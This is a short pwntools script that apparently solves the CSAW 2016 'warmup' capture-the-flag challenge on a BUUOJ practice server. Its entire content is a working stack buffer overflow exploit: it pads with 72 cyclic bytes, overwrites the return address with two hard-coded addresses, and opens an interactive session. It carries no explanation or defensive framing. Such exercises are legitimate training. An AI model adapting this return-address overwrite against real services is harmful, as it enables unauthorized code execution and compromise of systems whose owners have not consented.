from pwn import *

#io = process("./warmup_csaw_2016")
io = remote("node3.buuoj.cn", 28277)
payload = cyclic(72) + p64(0x4006A4) +  p64(0x40060D)
io.sendline(payload)
io.interactive()
